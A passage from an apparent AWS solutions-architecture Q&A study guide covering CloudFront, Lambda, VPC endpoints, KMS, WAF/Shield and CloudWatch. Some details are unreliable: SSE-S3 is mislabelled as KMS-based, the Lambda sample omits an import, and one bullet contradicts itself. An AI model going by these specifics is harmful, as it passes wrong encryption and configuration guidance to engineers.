- OAC supports all S3 features (SSE-KMS, S3 Object Lambda).
- OAC works with S3 buckets in any region (OAI required specific configurations for some regions).
- OAC supports POST/PUT/DELETE to S3 through CloudFront.

**Important:** Remove any existing public access from the bucket. The bucket should have Block Public Access enabled and no other public policies.

**Multi-account:** OAC can be used when the S3 bucket is in a different account than the CloudFront distribution. The bucket policy references the CloudFront distribution's ARN.

**Multi-region:** CloudFront is global; the S3 origin is regional. OAC works regardless of the bucket's region. For multi-region static content, use S3 CRR (Q5.4) with CloudFront Origin Groups for failover.

**Concepts introduced:**
- **OAC (Origin Access Control):** A CloudFront feature that restricts S3 bucket access to only a specific CloudFront distribution. Uses SigV4 signing. Replaces the older OAI.

### Q10.3: How do you handle cache invalidation in CloudFront when you deploy new application code?

**Answer:**

**Context:** After deploying new static assets (JS, CSS, images), CloudFront edge caches still serve the old version until the TTL expires.

**Strategies:**

1. **Cache Invalidation (brute force):**
   ```bash
   aws cloudfront create-invalidation \
     --distribution-id E1234567890 \
     --paths "/*"
   ```
   - First 1,000 paths free per month, then $0.005 per path.
   - `/*` invalidates everything (counts as 1 path).
   - Propagates to all edge locations in 5–15 minutes.
   - Problem: Expensive at scale, not instant, and a code smell — you're fighting the CDN.

2. **Cache Busting with Versioned File Names (recommended):**
   - Name files with a content hash: `app.a1b2c3d4.js` instead of `app.js`.
   - When code changes, the hash changes, so the filename changes.
   - CloudFront treats it as a new object — cache miss → fetches from origin.
   - Old files naturally expire from cache based on TTL.
   - Build tools (Webpack, Vite) do this automatically.

3. **Versioned Paths:**
   - `/v2/app.js` instead of `/v1/app.js`.
   - HTML references the new path. Old version stays cached but unused.

**Best practice:**
- Use versioned filenames for static assets (JS, CSS, images).
- Set long TTLs (1 year) for versioned assets — they'll never change.
- Set short TTLs (5–60 minutes) for HTML files that reference the versioned assets.
- Reserve CloudFront invalidation for emergency fixes only.

**Multi-account/Multi-region:** Cache invalidation is per-distribution. In a multi-region setup with separate distributions, you need to invalidate each one.

# 11. Lambda — Serverless Compute

---

### Q11.1: You're building an event-driven image processing pipeline: images uploaded to S3 need to be resized, thumbnails stored back in S3, and metadata saved to DynamoDB. Design the architecture.

**Answer:**

**Context:** This is a classic serverless event-driven pattern. Lambda is triggered by events, processes data, and writes results.

**Architecture:**

```
User uploads image
       │
       ▼
S3 Bucket (raw-images)
       │ S3 Event Notification
       ▼
Lambda: ResizeImage
       │
       ├── Read original from S3
       ├── Resize using Sharp/Pillow
       ├── Write thumbnail to S3 (thumbnails bucket)
       └── Write metadata to DynamoDB
              (imageId, dimensions, timestamp, status)
```

**S3 → Lambda trigger configuration:**
- S3 event type: `s3:ObjectCreated:*`
- Filter: prefix `uploads/`, suffix `.jpg`
- Lambda invoked asynchronously (S3 pushes the event to Lambda).

**Lambda function design:**

```python
import boto3
from PIL import Image
import io

s3 = boto3.client('s3')
ddb = boto3.resource('dynamodb')
table = ddb.Table('ImageMetadata')

def handler(event, context):
    for record in event['Records']:
        bucket = record['s3']['bucket']['name']
        key = record['s3']['object']['key']

        # Download original
        response = s3.get_object(Bucket=bucket, Key=key)
        img = Image.open(io.BytesIO(response['Body'].read()))

        # Resize
        img.thumbnail((300, 300))
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG')
        buffer.seek(0)

        # Upload thumbnail
        thumb_key = key.replace('uploads/', 'thumbnails/')
        s3.put_object(Bucket='thumbnails-bucket', Key=thumb_key, Body=buffer)

        # Save metadata
        table.put_item(Item={
            'imageId': key,
            'width': img.width,
            'height': img.height,
            'processedAt': str(datetime.utcnow())
        })
```

**Lambda Configuration:**
- Runtime: Python 3.12
- Memory: 1024 MB (image processing is CPU-bound; Lambda CPU scales proportionally with memory)
- Timeout: 30 seconds (image processing + S3 I/O)
- IAM Role: Allow `s3:GetObject` on raw bucket, `s3:PutObject` on thumbnails bucket, `dynamodb:PutItem` on metadata table.
- Layers: Pillow library as a Lambda Layer.

**Error handling:**
- S3 → Lambda is asynchronous invocation. Lambda retries twice on failure. After that, the event goes to a Dead Letter Queue (DLQ) — an SQS queue or SNS topic.
- Configure DLQ on the Lambda function. Monitor DLQ depth for failed events.

**Alternative with SQS (more control):**

```
S3 Event → SQS Queue → Lambda (SQS trigger)
```

Adding SQS between S3 and Lambda gives you:
- Buffering during traffic spikes.
- Fine-grained concurrency control (Lambda pulls from SQS at a configurable batch size).
- Better retry handling (SQS visibility timeout + DLQ).

**Multi-account:** Lambda function in account A can be triggered by S3 in account A only (same account for event notifications). For cross-account: use S3 → SNS (cross-account topic) → Lambda, or S3 → SQS (cross-account queue) → Lambda.

**Multi-region:** Deploy the same Lambda stack in each region. Use S3 CRR (Q5.4) if uploads come from multiple regions.

**Concepts introduced:**
- **Lambda:** Serverless compute. Runs code in response to events. Pay per invocation and duration. No server management.
- **Lambda Trigger:** An event source that invokes the function — S3 events, API Gateway, SQS, DynamoDB Streams, CloudWatch Events, etc.
- **Lambda Layer:** A package of libraries/dependencies that can be shared across functions. Separate from the function code. Max 5 layers per function.
- **DLQ (Dead Letter Queue):** A destination for events that fail processing after all retries. SQS queue or SNS topic. Prevents event loss.

---

### Q11.2: Your Lambda function is being throttled during peak hours, and some invocations are being dropped. How do you fix this?

**Answer:**

**Context:** Lambda has concurrency limits. Understanding them is critical for production workloads.

**Lambda Concurrency Model:**

```
Account Concurrency Limit (per region): 1,000 (default, can be increased)
    │
    ├── Unreserved Concurrency Pool: Shared by all functions
    │
    ├── Reserved Concurrency (per function):
    │   Guarantees this function gets N concurrent executions
    │   Also CAPS the function at N (won't exceed)
    │
    └── Provisioned Concurrency (per function version/alias):
        Pre-initializes N execution environments
        No cold starts for these N environments
        You pay for provisioned concurrency even if unused
```

**Throttling scenarios:**

1. **Account limit reached:** All functions collectively hit 1,000. Other functions starve.
   - Fix: Request a limit increase (AWS supports 10,000+ easily). Set reserved concurrency on critical functions so they're guaranteed capacity.

2. **Reserved concurrency exceeded:** A function with reserved concurrency of 100 gets > 100 simultaneous invocations.
   - Fix: Increase reserved concurrency. Or redesign for async processing with SQS buffering.

3. **Burst limit:** Lambda can burst up to 500–3,000 concurrent executions instantly (region-dependent), then grows by 500/minute.
   - Fix: For predictable traffic spikes, use Provisioned Concurrency. For unpredictable spikes, use SQS as a buffer.

**Throttling behavior by invocation type:**
- **Synchronous (API Gateway):** Returns 429 to the caller. Client must retry.
- **Asynchronous (S3, SNS):** Lambda retries twice with backoff. Then sends to DLQ if configured.
- **Stream-based (SQS, DynamoDB Streams, Kinesis):** Lambda retries until the record expires. Blocks the shard/queue.

**Cold Starts:**
- First invocation (or scale-up) requires creating a new execution environment: download code, initialize runtime, run initialization code.
- Adds 100ms–10s depending on runtime, code size, VPC configuration.
- Mitigate with Provisioned Concurrency (Q11.2 above), smaller deployment packages, and keeping functions warm.

**Multi-account:** Concurrency limits are per-account, per-region. Separate workloads into different accounts if they compete for concurrency. Use AWS Organizations and SCPs to manage.

**Multi-region:** Concurrency limits are independent per region. Distribute functions across regions if needed.

**Concepts introduced:**
- **Lambda Concurrency:** The number of simultaneous function executions. Account-level limit shared by all functions, with reserved and provisioned concurrency for individual functions.
- **Reserved Concurrency:** Guarantees AND caps concurrent executions for a function. Protects the function from starvation but also limits its maximum concurrency.
- **Provisioned Concurrency:** Pre-initializes execution environments to eliminate cold starts. Costs money even when idle.
- **Cold Start:** The initialization delay when Lambda creates a new execution environment. Includes downloading code, starting runtime, and running init code.

### Q11.3: Your Lambda function needs to connect to an RDS database in a private subnet. How do you configure this, and what are the implications?

**Answer:**

**Context:** By default, Lambda runs in an AWS-managed VPC with internet access but no access to your VPC resources.

**Lambda VPC Integration:**

```
Your VPC:
┌─────────────────────────────────────────────┐
│                                             │
│  Private Subnet-A     Private Subnet-B      │
│  ┌─────────────┐     ┌─────────────┐       │
│  │ Lambda ENI   │     │ Lambda ENI   │       │
│  │ (Hyperplane) │     │ (Hyperplane) │       │
│  └──────┬──────┘     └──────┬──────┘       │
│         │                    │              │
│         └────────┬───────────┘              │
│                  │                          │
│         ┌────────┴────────┐                 │
│         │  RDS (Private)   │                 │
│         └─────────────────┘                 │
│                                             │
│  NAT GW (for internet access, if needed)    │
└─────────────────────────────────────────────┘
```

**Configuration:**
- Specify VPC, subnets (at least 2 for HA), and Security Groups for the Lambda function.
- Lambda creates Hyperplane ENIs (shared across invocations, not per-invocation like the old model).
- The Lambda function's SG must be allowed by the RDS SG.

**Implications:**

1. **No internet access by default:** Once in your VPC, Lambda loses its default internet access. It's in your private subnet.
   - For internet access: route through NAT Gateway (Q1.2). Costs money.
   - For AWS service access: use VPC Endpoints (Q12.1). Free for S3/DynamoDB Gateway Endpoints.

2. **Cold start penalty (much improved):** The old model created new ENIs per invocation (90+ seconds). The new Hyperplane model shares ENIs — cold starts are only marginally longer (~1-2 seconds additional). Not a major concern anymore.

3. **IP address consumption:** Hyperplane ENIs use IPs from your subnets. For highly concurrent functions, ensure subnets have enough IPs. A `/24` subnet with 251 usable IPs is usually sufficient.

**RDS Proxy for Lambda → RDS:**
Lambda can create hundreds of concurrent executions, each opening a database connection. RDS has a max connection limit (based on instance memory). This can exhaust connections.

Solution: RDS Proxy (explained in Q6.1). Lambda connects to RDS Proxy, which pools connections. RDS Proxy also handles failover transparently.

```
Lambda → RDS Proxy → RDS Primary
                         │
                    (Failover)
                         │
                     RDS Standby
```

**Multi-account:** Lambda in account A connecting to RDS in account B requires: network connectivity (VPC peering/TGW), SG rules allowing cross-VPC traffic, and database-level authentication. RDS Proxy can be in either account.

**Multi-region:** Lambda functions are regional. For multi-region, deploy separate Lambda functions in each region connecting to local RDS instances (or Aurora Global Database readers).

**Concepts introduced:**
- **Lambda VPC Integration:** Connecting Lambda to a VPC to access private resources. Uses Hyperplane ENIs. Requires NAT GW or VPC Endpoints for internet/AWS service access.
- **Hyperplane ENI:** Lambda's shared, managed ENI model for VPC integration. One ENI per subnet per Security Group combination, shared across invocations. Much faster than the old per-invocation ENI model.

# 12. AWS PrivateLink & VPC Endpoints

---

### Q12.1: What's the difference between Gateway and Interface VPC Endpoints, and when do you use each?

**Answer:**

**Context:** VPC Endpoints let you access AWS services without internet, NAT GW, or VPN. There are two types.

**Gateway Endpoints:**
- Available ONLY for S3 and DynamoDB.
- Free — no hourly or data processing charges.
- Route table-based: A prefix list route in your route table directs traffic to the endpoint.
- Cannot be accessed from on-premises (VPN/Direct Connect) or from peered VPCs.
- Can have an endpoint policy to restrict access.

Already covered in Q1.6.

**Interface Endpoints (powered by PrivateLink):**
- Available for 100+ AWS services (SQS, SNS, KMS, CloudWatch, EC2 API, SSM, etc.).
- Creates an ENI in your subnet with a private IP.
- Charged hourly (~$0.01/hr per AZ) + per-GB processed (~$0.01/GB).
- Can be accessed from on-premises via VPN/Direct Connect.
- Can be accessed from peered VPCs.
- Supports Security Groups (on the ENI).
- Supports private DNS (resolves the service's public DNS name to the private endpoint IP).

**Architecture comparison:**

```
Gateway Endpoint:
  EC2 → Route Table (prefix list → vpce) → S3/DynamoDB
  (No ENI, no SG, route-table based)

Interface Endpoint:
  EC2 → ENI (vpce-abc.sqs.us-east-1.vpce.amazonaws.com) → SQS
  (Has ENI, has SG, DNS-based)
  With Private DNS: EC2 → sqs.us-east-1.amazonaws.com → resolves to ENI private IP
```

**Decision:**

```
| Criteria            | Gateway               | Interface              |
|---------------------|----------------------|------------------------|
| Services supported  | S3, DynamoDB only    | 100+ services          |
| Cost                | Free                 | ~$7.20/month/AZ + data |
| Mechanism           | Route table entry    | ENI with private IP    |
| Cross-VPC access    | No                   | Yes (via peering/TGW)  |
| On-prem access      | No                   | Yes                    |
| Security Group      | No                   | Yes                    |
```

**Common pattern:** Use Gateway Endpoint for S3 (free, simple). Use Interface Endpoints for all other services (KMS, SQS, CloudWatch, etc.) when you need private access.

**Multi-account:** Interface Endpoints are per-VPC. Each account's VPC needs its own endpoints. In a centralized model, you can create endpoints in a shared VPC and route traffic through TGW, but this adds complexity. Alternatively, use AWS PrivateLink with shared endpoint services (Q12.2).

**Multi-region:** Endpoints are regional. Each region needs its own. Interface Endpoints can only reach services in the same region.

**Concepts introduced:**
- **Gateway VPC Endpoint:** Free, route-table-based access to S3 and DynamoDB from within a VPC. No ENI, no SG.
- **Interface VPC Endpoint:** ENI-based private access to AWS services via PrivateLink. Supports 100+ services. Has SGs, private DNS, and is accessible from on-prem and peered VPCs.

---

### Q12.2: You're building an internal service that other teams (in different VPCs and accounts) should consume privately without exposing it to the internet. How?

**Answer:**

**Context:** You want to expose a service in your VPC to consumers in other VPCs/accounts without VPC peering, TGW, or internet exposure.

**Solution: AWS PrivateLink (VPC Endpoint Service)**

```
Provider Account                           Consumer Account
┌─────────────────────────┐               ┌─────────────────────────┐

└─────────────────────────┘               └─────────────────────────┘
```

**Provider setup:**
1. Deploy your service behind an NLB (NLB required — ALB not directly supported, but ALB can be a target of NLB).
2. Create a VPC Endpoint Service pointing to the NLB.
3. Configure acceptance: auto-accept or manual approval of consumer connections.
4. Add consumer account IDs to the allowed principals list.

**Consumer setup:**
1. Create an Interface VPC Endpoint targeting the provider's service name.
2. The endpoint creates an ENI in the consumer's VPC with a private IP.
3. The consumer application connects to the endpoint's DNS name.

**Key properties:**
- **Unidirectional:** Consumer → Provider only. The provider cannot initiate connections to the consumer.
- **CIDR-agnostic:** Works even with overlapping IP ranges between provider and consumer VPCs.
- **No route table changes** needed in either VPC.
- **Provider sees the consumer's IP** (from the NLB's perspective, the source IP is the endpoint ENI's IP — not the actual consumer's IP. Use Proxy Protocol v2 on NLB for source IP preservation if needed).

**Use cases:**
- SaaS services consumed by customer VPCs.
- Shared internal services (auth, logging, data platforms) consumed by application teams in different accounts.
- B2B API exposure without internet.

**Multi-account:** PrivateLink is DESIGNED for cross-account service consumption. The provider whitelists consumer account IDs. No network peering required.

**Multi-region:** PrivateLink does NOT work cross-region. The consumer endpoint must be in the same region as the provider's endpoint service. For cross-region consumption, replicate the service in each region.

**Concepts introduced:**
- **AWS PrivateLink:** Technology that enables private connectivity between VPCs and services without internet exposure. Underpins Interface VPC Endpoints and VPC Endpoint Services.
- **VPC Endpoint Service:** The provider-side PrivateLink construct. Backed by an NLB. Consumers connect to it via Interface VPC Endpoints.

# 13. KMS — Encryption & Key Management

---

### Q13.1: Explain how AWS KMS encryption works for S3 objects. What happens when you upload and download an encrypted object?

**Answer:**

**Context:** KMS provides centralized key management. Understanding envelope encryption is critical for every AWS encryption scenario.

**Envelope Encryption:**

Direct encryption with KMS has a 4 KB data limit (KMS API constraint). For larger data, AWS uses envelope encryption:

```
Upload (Encryption):
1. Client calls KMS: GenerateDataKey(KeyId=CMK)
2. KMS returns:
   - Plaintext data key (used to encrypt the data)
   - Encrypted data key (data key encrypted with the CMK)
3. Client encrypts the object with the plaintext data key (AES-256)
4. Client stores: Encrypted object + Encrypted data key (as metadata)
5. Client discards the plaintext data key from memory

Download (Decryption):
1. Client retrieves: Encrypted object + Encrypted data key
2. Client calls KMS: Decrypt(CiphertextBlob=encrypted_data_key)
3. KMS returns: Plaintext data key
4. Client decrypts the object with the plaintext data key
5. Client discards the plaintext data key from memory
```

**Why envelope encryption?**
- Large data never leaves the client/service for encryption — only the small data key goes to KMS.
- Performance: Symmetric encryption (AES-256) is fast and local.
- Security: The CMK never leaves KMS. Only data keys are used outside KMS.

**S3 Server-Side Encryption (SSE) options:**

1. **SSE-S3 (aws:kms with AWS-managed key):** AWS manages everything. Default encryption. Free. You have no control over the key.

2. **SSE-KMS (aws:kms with customer-managed CMK):** You manage the CMK — control rotation, policies, auditing. Each S3 PUT/GET calls KMS (generates/decrypts data key). KMS API calls are charged ($0.03 per 10,000 requests) and have rate limits (5,500–30,000 requests/sec depending on region).

3. **SSE-C (Customer-provided keys):** You provide the encryption key with each request. AWS uses it, discards it. You manage key storage. Complex operationally.

4. **Client-side encryption:** You encrypt before uploading. AWS never sees plaintext. Full control but full responsibility.

**KMS request rate consideration:**
For high-throughput S3 workloads (thousands of PUTs/GETs per second), SSE-KMS generates a KMS API call per object operation. This can hit KMS throttling limits.

**Solutions:**
- Use S3 Bucket Keys: Reduces KMS calls by generating a bucket-level data key, then deriving per-object keys locally. Reduces KMS calls by up to 99%.
- Request KMS quota increase.

**Multi-account:** CMKs are per-account, per-region. For cross-account encryption/decryption:
1. The CMK key policy must allow the other account's role to call `kms:Decrypt`.
2. The other account's IAM policy must allow `kms:Decrypt` on the CMK ARN.
Cross-account KMS access follows the same dual-authorization model as S3 cross-account (Q2.1).

**Multi-region:** KMS keys are regional by default. For multi-region workloads, use **KMS Multi-Region Keys (MRKs):** replicas of the same key material in different regions. Encrypt in one region, decrypt in another without cross-region KMS calls.

**Concepts introduced:**
- **Envelope Encryption:** Encrypt data with a data key, encrypt the data key with a master key (CMK). The CMK never leaves KMS.
- **CMK (Customer Master Key) / KMS Key:** The top-level key in KMS. Can be AWS-managed, customer-managed, or custom key store (CloudHSM-backed).
- **Data Key:** A symmetric key generated by KMS, used to encrypt actual data. Exists in plaintext only briefly during encryption/decryption.
- **S3 Bucket Keys:** Reduce KMS API calls by caching a bucket-level key and deriving per-object keys locally.
- **KMS Multi-Region Keys (MRKs):** Key replicas with the same key material across regions. Encrypt in one region, decrypt in another.

---

### Q13.2: How do you control who can use a KMS key? Explain the difference between the key policy and IAM policies for KMS.

**Answer:**

**Context:** KMS uses a unique authorization model. Unlike most AWS services, KMS key policies are the PRIMARY access control mechanism — IAM policies alone aren't sufficient.

**KMS Key Policy (Resource-based policy on the key):**

Every KMS key MUST have a key policy. Without it, no one can use the key — not even the account root.

**Default key policy:**

```json
{
  "Sid": "Enable IAM User Permissions",
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::111111111111:root"},
  "Action": "kms:*",
  "Resource": "*"
}
```

This default statement doesn't directly allow the root user to use the key. Instead, it **delegates authority to IAM** — meaning IAM policies in that account can now grant KMS permissions. Without this statement, IAM policies are ignored for this key.

**Key policy + IAM policy interaction:**

```
Key Policy says "Allow Account A root" (delegates to IAM)
    +
IAM Policy on Role X says "Allow kms:Decrypt on this key"
    =
Role X can decrypt with this key
```

**For cross-account:**

```
Key Policy says:
  "Allow arn:aws:iam::222222222222:root to kms:Decrypt"
    +
Account B's IAM Policy on Role Y says:
  "Allow kms:Decrypt on arn:aws:kms:...:key/key-id"
    =
Role Y in Account B can decrypt with this key

BOTH must be present.
```

**Grants:**
- Temporary, fine-grained permissions on a KMS key.
- Created programmatically. Used by AWS services (e.g., EBS asks KMS for a grant to decrypt volumes during instance launch).
- Useful for delegating key use to specific operations without modifying the key policy.

**Key rotation:**
- AWS-managed keys: Rotated annually (automatic, transparent).
- Customer-managed keys: Enable automatic rotation (new key material annually). Old material retained for decryption of previously encrypted data. The key ID doesn't change.
- Manual rotation: Create a new key, re-encrypt data, update aliases. Full control but operational burden.

**Multi-account:** Key policies control cross-account key access. Combined with IAM policies in the consuming account.

**Multi-region:** Use MRKs (explained in Q13.1) for cross-region key usage without key policy complexity.

**Concepts introduced:**
- **KMS Key Policy:** The primary authorization mechanism for KMS keys. Must exist on every key. Delegates to IAM or directly grants access.
- **KMS Grants:** Programmatic, temporary permissions on a key. Used by AWS services for operational key access.
- **Key Rotation:** Automatic replacement of cryptographic key material. Old material retained for decryption. Key ID remains the same.

# 14. WAF & Shield — Application & Network Protection

---

### Q14.1: Your web application is being targeted by SQL injection attacks and excessive request rates from specific IP ranges. How do you protect it with AWS WAF?

**Answer:**

**Context:** AWS WAF is a web application firewall that filters HTTP/HTTPS traffic based on rules. Attached to CloudFront, ALB, API Gateway, or AppSync.

**WAF Architecture:**

```
Internet → CloudFront → WAF Web ACL → ALB → Application
                           │
              ┌────────────┼────────────┐
              │            │            │
         Rule Group 1  Rule Group 2  Custom Rules
         (AWS Managed)  (AWS Managed)  (Your rules)
         SQL Injection  IP Reputation  Rate Limiting
```

**WAF Components:**

1. **Web ACL:** The top-level container. Associated with one or more AWS resources (CloudFront, ALB, etc.). Contains rules and rule groups evaluated in priority order.

2. **Rules:** Define conditions and actions.
   - **Action:** ALLOW, BLOCK, or COUNT (monitor without blocking).
   - **Rule types:** Regular rules, rate-based rules.

3. **Rule Groups:** Collections of rules. AWS Managed Rule Groups provide pre-built protection.

**Configuration for this scenario:**

```
Web ACL: ProductionWebACL

Rule 1 (Priority 1): AWS Managed - AWSManagedRulesCommonRuleSet
  → Blocks common attacks (XSS, path traversal, etc.)
  → Action: BLOCK

Rule 2 (Priority 2): AWS Managed - AWSManagedRulesSQLiRuleSet
  → Blocks SQL injection patterns
  → Action: BLOCK

Rule 3 (Priority 3): AWS Managed - AWSManagedRulesKnownBadInputsRuleSet
  → Blocks known malicious patterns (Log4j, etc.)
  → Action: BLOCK

Rule 4 (Priority 4): IP Set Rule
  → Block specific malicious CIDR ranges
  → Source: Threat intelligence feed → IP Set
  → Action: BLOCK

Rule 5 (Priority 5): Rate-Based Rule
  → Limit: 2000 requests per 5 minutes per source IP
  → Action: BLOCK (auto-unblocks when rate drops)

Default Action: ALLOW
```

**Rate-Based Rules:**
- Tracks request rate per source IP (or custom key).
- Automatically blocks IPs that exceed the threshold.
- Automatically unblocks when the rate drops.
- Minimum threshold: 100 requests in 5 minutes.

**WAF Logging:**
- Full request logging to S3, CloudWatch Logs, or Kinesis Data Firehose.
- Log every request (allow, block, count) with full headers, body (optional), and matching rule.
- Essential for tuning false positives.

**False positive handling:**
- Start with COUNT mode on new rules. Analyze logs. Then switch to BLOCK.
- Use scope-down statements to exclude specific paths or IPs from certain rules.
- Example: Exclude `/admin` path from SQL injection rules if the admin panel sends SQL-like content legitimately.

**Cost:** ~$5/Web ACL/month + $1/rule/month + $0.60/million requests inspected. AWS Managed Rule Groups: $1–$20/month depending on the group.

**Multi-account:** WAF is per-account, per-resource. Use AWS Firewall Manager (part of AWS Organizations) to deploy WAF policies across all accounts from a central security account. Firewall Manager automatically applies Web ACLs to new resources.

**Multi-region:** WAF for CloudFront is global (deployed in us-east-1). WAF for ALB/API Gateway is regional. You need separate Web ACLs in each region. Firewall Manager can manage cross-region deployment.

**Concepts introduced:**
- **AWS WAF:** Layer 7 web application firewall. Inspects HTTP/HTTPS requests. Attaches to CloudFront, ALB, API Gateway.
- **Web ACL:** The container for WAF rules. Associated with AWS resources. Rules evaluated in priority order.
- **Rate-Based Rule:** Automatically blocks source IPs exceeding a request threshold. Self-healing (unblocks automatically).
- **AWS Managed Rule Groups:** Pre-built rule sets by AWS and AWS Marketplace partners for common threats (OWASP Top 10, bots, IP reputation).

### Q14.2: Your application is under a DDoS attack. You see a volumetric Layer 3/4 attack flooding your infrastructure. What protections does AWS provide?

**Answer:**

**Context:** DDoS attacks target different layers — Layer 3/4 (network/transport) with volume, Layer 7 (application) with complexity.

**AWS Shield:**

```
| Feature              | Shield Standard          | Shield Advanced            |
|----------------------|--------------------------|----------------------------|
| Cost                 | Free (all accounts)      | $3,000/month + data fees   |
| Layer 3/4 Protection | Automatic, always-on     | Enhanced detection + DRT    |
| Layer 7 Protection   | None                     | Via WAF integration         |
| DDoS Response Team   | No                       | Yes (DRT - 24/7)           |
| Cost Protection      | No                       | Yes (credits for scaling)  |
| Visibility           | Basic                    | Real-time metrics, reports |
| Scope                | All resources             | Specified resources        |
```

**Shield Standard (Free):**
- Automatically protects all AWS accounts.
- Defends against most common Layer 3/4 attacks (SYN floods, UDP reflection, etc.).
- Operates at the AWS network edge.
- No configuration needed — it's always on.

**Shield Advanced ($3,000/month):**
- Dedicated DDoS protection for specified resources (CloudFront, ALB, NLB, EIPs, Global Accelerator).
- DDoS Response Team (DRT): 24/7 AWS security engineers help mitigate attacks. Can modify WAF rules on your behalf during an attack.
- Cost protection: AWS credits scaling costs (EC2, CloudFront data transfer, ALB) caused by DDoS attacks.
- Enhanced monitoring: Near-real-time DDoS metrics in CloudWatch.
- Automatic WAF rule creation for Layer 7 attacks.

**Full protection architecture:**

```
DDoS Attack
    │
    ▼
AWS Edge Network
    │ Shield Standard (Layer 3/4 filtering)
    ▼
CloudFront (Edge caching absorbs traffic)
    │ Shield Advanced (enhanced L3/L4)
    ▼
WAF Web ACL (Layer 7 filtering)
    │ Rate limiting, SQL injection, bot blocking
    ▼
ALB (Auto-scales)
    │
    ▼
EC2 ASG (Auto-scales)
```

**Design principles for DDoS resilience:**
1. Use CloudFront/Global Accelerator as the entry point — absorbs traffic at the edge.
2. Use WAF for Layer 7 attacks (rate limiting, request filtering).
3. Use ALB/EC2 Auto Scaling — if valid traffic increases, scale to handle it.
4. Minimize attack surface — private subnets, no direct public EC2 IPs, no exposed databases.
5. Shield Advanced for high-value targets — the DRT and cost protection are the key benefits.

**Multi-account:** Shield Advanced protects resources in individual accounts. Use AWS Firewall Manager to manage Shield Advanced across an Organization from a central account.

**Multi-region:** Shield operates at the AWS edge (global for CloudFront/Route 53) and regionally for ALBs/EIPs. Shield Advanced protections are per-resource in each region.

**Concepts introduced:**
- **AWS Shield Standard:** Free, automatic Layer 3/4 DDoS protection for all AWS accounts.
- **AWS Shield Advanced:** Premium DDoS protection with DRT, cost protection, enhanced detection, and WAF integration. $3,000/month.
- **DDoS Response Team (DRT):** AWS security engineers available 24/7 for Shield Advanced customers during active DDoS attacks.

# 15. CloudWatch — Observability

---

### Q15.1: Your production application is healthy according to all metrics (CPU, memory, disk), but users are reporting slow page loads and errors. How do you use CloudWatch to diagnose this?

**Answer:**

**Context:** Infrastructure metrics being "green" doesn't mean the application is healthy. This is the classic "metrics lie" scenario. The gap between infrastructure metrics and user experience is where application-level observability matters.

**CloudWatch Observability Stack:**

**Diagnosis approach for "healthy metrics, bad UX":**

1. **Check ALB metrics (not EC2 metrics):**
   - `TargetResponseTime`: P99 latency from ALB to targets. If high, the app is slow.
   - `HTTPCode_Target_5XX_Count`: App errors returning 5xx.
   - `HTTPCode_ELB_5XX_Count`: ALB-level errors (502/503/504).
   - `SurgeQueueLength` / `SpilloverCount`: ALB request queue full — requests being dropped.
   - `ActiveConnectionCount`: Connection count — maybe connection limit reached.

2. **Check CloudWatch Logs:**
   - Application logs: Search for errors, stack traces, slow queries.
   - ALB access logs: Identify slow endpoints, error-heavy paths.

3. **CloudWatch Logs Insights query (explained below):**
   ```
   fields @timestamp, @message
   | filter @message like /ERROR|Exception|timeout/
   | stats count() as errors by bin(5m)
   | sort errors desc
   ```

4. **Custom Metrics (critical for app-level observability):**
   - Application latency (P50, P95, P99).
   - Error rates per endpoint.
   - Queue depth, cache hit rates.
   - Business metrics (orders/min, logins/sec).

   Push custom metrics via CloudWatch Agent or `PutMetricData` API.

5. **CloudWatch Synthetics (Canaries):**
   - Automated scripts that run periodically (every 1–5 minutes) to test your endpoints.
   - Simulate user interactions (login flow, checkout, API calls).
   - Report latency, availability, and screenshot failures.
   - Catches issues before users report them.

6. **CloudWatch RUM (Real User Monitoring):**
   - JavaScript snippet in your web app.
   - Captures actual user experience: page load time, JS errors, Core Web Vitals.
   - Shows performance by geography, browser, device.

**Likely root causes when infra metrics are fine:**
- Downstream dependency slow (external API, database query).
- DNS resolution slow.
- TLS handshake overhead.
- Application-level memory leak (not reflected in EC2 CPU).
- Resource contention in a specific microservice.
- Network issues between components (cross-AZ latency).

**CloudWatch Alarms:**

Three types:
1. **Metric Alarm:** Triggers when a metric crosses a threshold for N evaluation periods.
2. **Anomaly Detection Alarm:** Uses ML to learn metric patterns and alerts on deviations. No threshold to set — adapts automatically.
3. **Composite Alarm:** Combines multiple alarms with AND/OR logic. Reduces alarm noise. Example: "Alert only if BOTH p99 latency is high AND error rate is above 5%."

**Alarm actions:** Send to SNS topic (which can trigger Lambda, email, SMS, PagerDuty). Or trigger ASG scaling policies.

**Multi-account:** Use CloudWatch Cross-Account Observability — a monitoring account can view metrics, logs, and traces from source accounts. One dashboard for all accounts.

**Multi-region:** CloudWatch is regional. Use Cross-Account/Cross-Region Dashboards to create a single pane of glass. Requires setup in each source region.

**Concepts introduced:**
- **CloudWatch Metrics:** Time-series data points. Default metrics (EC2, ALB, RDS) are free. Custom metrics via PutMetricData or CloudWatch Agent.
- **CloudWatch Logs:** Centralized log aggregation. Logs organized into Log Groups → Log Streams.
- **CloudWatch Alarms:** Automated notifications based on metric thresholds, anomaly detection, or composite logic.
- **CloudWatch Synthetics (Canaries):** Automated, scheduled scripts that test endpoints and report availability/performance.
- **CloudWatch RUM:** Real User Monitoring via JavaScript in the browser. Captures actual user experience metrics.
- **Composite Alarm:** Combines multiple alarms to reduce noise and create smarter alerting.

### Q15.2: You need to monitor EC2 instances for memory utilization, disk space, and custom application metrics. Default CloudWatch metrics don't include these. How?

**Answer:**

**Context:** EC2 default metrics include CPU, network, disk I/O, and status checks. Memory and disk space are OS-level metrics that require the CloudWatch Agent.

**CloudWatch Agent:**

Install on EC2 instances. Collects:
- Memory utilization, swap usage.
- Disk space, disk I/O (per-mount).
- Custom application logs (tail log files → send to CloudWatch Logs).
- StatsD / collectd metrics (from existing monitoring agents).
- Procstat (per-process CPU, memory).

**Agent configuration (JSON):**

```json
{
  "metrics": {
    "namespace": "CustomMetrics/App",
    "metrics_collected": {
      "mem": {
        "measurement": ["mem_used_percent"],
        "metrics_collection_interval": 60
      },
      "disk": {
        "measurement": ["disk_used_percent"],
        "resources": ["/", "/data"],
        "metrics_collection_interval": 60
      }
    }
  },
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/log/app/application.log",
            "log_group_name": "/app/production",
            "log_stream_name": "{instance_id}",
            "timestamp_format": "%Y-%m-%d %H:%M:%S"
          }
        ]
      }
    }
  }
}
```

**Deployment:** Use SSM (Systems Manager) Run Command to deploy and configure the agent across all instances simultaneously. Store the config in SSM Parameter Store.

